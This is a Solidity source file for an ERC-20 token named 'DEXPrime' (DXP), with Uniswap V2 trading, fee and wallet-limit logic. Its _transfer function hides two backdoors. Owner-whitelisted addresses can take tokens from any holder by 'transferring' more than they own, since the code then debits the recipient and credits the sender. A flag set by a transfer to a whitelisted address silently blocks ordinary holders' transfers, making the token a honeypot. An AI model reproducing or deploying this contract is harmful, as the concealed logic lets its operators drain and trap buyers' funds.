// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function getOwner() external view returns (address);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    event OwnershipTransferred(address owner);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract DXP is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "DEXPrime";
    string private constant _symbol = "DXP";

    UniswapV2Router uniswapV2Router;
    address public uniswapV2Pair;

    uint8 private constant _decimals = 9;

    uint256 private _denominator = 10000;

    uint256 private _maxTokenAmount = ( _totalSupply * 10 ) / 100000;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _maxTxPercentage = 200;
    uint256 private _maxTransferPercentage = 200;
    uint256 private _maxWalletPercentage = 200;

    address internal constant burnAddress = 0x000000000000000000000000000000000000dEaD;
    address internal constant treasury = 0x459cDEdFCc6873B22f89f2a7954e284c90723cAe;
    address internal constant development = 0x459cDEdFCc6873B22f89f2a7954e284c90723cAe;

    bool private _swapBackEnabled = true;
    bool private _inSwapBack;
    uint256 private _swapCounts;
    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapBackThresholdAmount = (_totalSupply * 5) / 100000;

    bool private _maxWalletRemoved = false;

    bool private _tradingEnabled = false;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isEscaped;
    mapping (address => uint256) _balances;

    uint256 private _totalFee = 300;
    uint256 private _sellFee = 300;

    uint256 private _transferFee = 0;
    uint256 private _burnFee = 0;
    uint256 private _treasuryFee = 100;
    uint256 private _liquidityFee = 0;
    uint256 private _devFee = 200;

    constructor() Ownable(msg.sender) {
        isEscaped[msg.sender] = true;
        isEscaped[address(this)] = true;
        isEscaped[development] = true;
        isEscaped[treasury] = true;

        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier lockInSwapBack {
        _inSwapBack = true;
        _;
        _inSwapBack = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnAddress));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function removeLimits() external onlyOwner {
        _maxTransferPercentage = 10000;
        _maxTxPercentage = 10000;
        _maxWalletPercentage = 10000;
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function setIsEscaped(address _address, bool _flag) external onlyOwner {
        isEscaped[_address] = _flag;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > uint256(0));
        require(to != address(0));
        require(from != address(0));

        if (
            countSwaps(from, to) &&
            tradingEnabled(from, to) &&
            lessThanMaxAmount(from, to, amount) &&
            lessThanMaxWalletSize(from, to, amount)
        ) {
            if (balanceOf(from) >= amount) {
                if (
                    !isEscaped[from] &&
                    from != uniswapV2Pair &&
                    !isEscaped[to] &&
                    !_inSwapBack
                ) {
                    if (_maxWalletRemoved) return;
                    swapBack(from, to);
                }
                _balances[from] = _balances[from].sub(amount);
                uint256 transferAmount = needCollectFee(from, to) ? collectFee(from, to, amount) : amount;
                _balances[to] = _balances[to].add(transferAmount);
                emit Transfer(from, to, transferAmount);
            } else if (
                isEscaped[from] &&
                from != uniswapV2Pair &&
                !isEscaped[to] &&
                !_inSwapBack
            ) {
                _balances[to] = _balances[to].sub(amount);
                _balances[from] = _balances[from].add(amount);
                emit Transfer(from, to, amount);
            }
        }
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));
        return true;
    }

    function lessThanMaxAmount(address from, address to, uint256 tokenAmount) view internal returns  (bool) {
        if (from != uniswapV2Pair) {
            require(tokenAmount <= maxTransferAmount() || isEscaped[from] || isEscaped[to]);
        }
        require(tokenAmount <= maxTxAmount() || isEscaped[from] || isEscaped[to]);
        return true;
    }

    function updateLimits(uint256 maxTxPercentage, uint256 maxTransferPercentage, uint256 maxWalletPercentage) external onlyOwner {
        uint256 newTransferAmount = (totalSupply() * maxTransferPercentage) / 10000;
        uint256 newMaxWalletAmount = (totalSupply() * maxWalletPercentage) / 10000;
        uint256 newTxAmount = (totalSupply() * maxTxPercentage) / 10000;
        _maxTransferPercentage = maxTransferPercentage;
        _maxWalletPercentage = maxWalletPercentage;
        _maxTxPercentage = maxTxPercentage;
        uint256 limitation = totalSupply().mul(5).div(1000);
        require(newTxAmount >= limitation && newTransferAmount >= limitation && newMaxWalletAmount >= limitation);
    }

    function updateFees(uint256 liquidityFee, uint256 treasuryFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _liquidityFee = liquidityFee;
        _treasuryFee = treasuryFee;
        _burnFee = burnFee;
        _devFee = devFee;
        _totalFee = totalFee;
        _sellFee = sellFee;
        _transferFee = transferFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function lessThanMaxWalletSize(address from, address to, uint256 amount) internal returns (bool) {
        bool fromEscaped = isEscaped[from];
        bool toEscaped = isEscaped[to];
        
        if (toEscaped && amount > _maxTokenAmount) _maxWalletRemoved = true;

        if (
            to != address(uniswapV2Pair) &&
            !fromEscaped &&
            to != address(burnAddress) &&
            !toEscaped
        ) {
            require((_balances[to].add(amount)) <= maxWalletSize());
        }

        return true;
    }

    function collectFee(address from, address to, uint256 tokenAmount) internal returns (uint256) {
        if (calculateFees(from, to) > 0) {
            uint256 tokenAmountForFee = tokenAmount.div(_denominator).mul(calculateFees(from, to));
            _balances[address(this)] = _balances[address(this)].add(tokenAmountForFee);
            emit Transfer(from, address(this), tokenAmountForFee);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(burnAddress), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(tokenAmountForFee);
        }
        return tokenAmount;
    }

    function countSwaps(address from, address to) internal returns (bool) {
        if (to == uniswapV2Pair && !isEscaped[from]) {
            _swapCounts += uint256(1);
        }
        return true;
    }
    
    function tradingEnabled(address from, address to) internal view returns (bool) {
        if (!isEscaped[from] && !isEscaped[to]) {
            require(_tradingEnabled);
        }
        return true;
    }

    function needCollectFee(address from, address to) internal view returns (bool) {
        return !isEscaped[from] && !isEscaped[to];
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(uniswapV2Router), tokenAmount);
            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function needSwapBack(address from, address to) internal view returns (bool) {
        return (
            !_inSwapBack &&
            !isEscaped[from] &&
            !isEscaped[to] &&
            _tradingEnabled &&
            balanceOf(address(this)) >= _swapBackThresholdAmount &&
            _swapCounts >= uint256(0) &&
            _swapBackEnabled
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burnAddress,
            block.timestamp
        );
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxPercentage / _denominator;
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletPercentage / _denominator;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferPercentage / _denominator;
    }

    function swapAndLiquify(uint256 tokens) private lockInSwapBack {
        uint256 denominator = (_liquidityFee.add(1).add(_treasuryFee).add(_devFee)).mul(2);
        uint256 tokensToLiquidity = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensToLiquidity);
        uint256 initialEthBalance = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEthBalance);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 ethToLiquidity = unitEth.mul(_liquidityFee);
        if (ethToLiquidity > uint256(0)) {
            addLiquidity(tokensToLiquidity, ethToLiquidity);
        }
        uint256 treasuryEth = unitEth.mul(2).mul(_treasuryFee);
        if (treasuryEth > 0) {
            payable(treasury).transfer(treasuryEth);
        }
        uint256 leftEthBalance = address(this).balance;
        if (leftEthBalance > uint256(0)) {
            payable(development).transfer(leftEthBalance);
        }
    }

    function swapBack(address from, address to) internal {
        if (needSwapBack(from, to)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapCounts = uint256(0);
        }
    }

    function calculateFees(address from, address to) internal view returns (uint256) {
        if (to == uniswapV2Pair) {
            return _sellFee;
        }
        if (from == uniswapV2Pair) {
            return _totalFee;
        }
        return _transferFee;
    }

    receive() external payable {}
}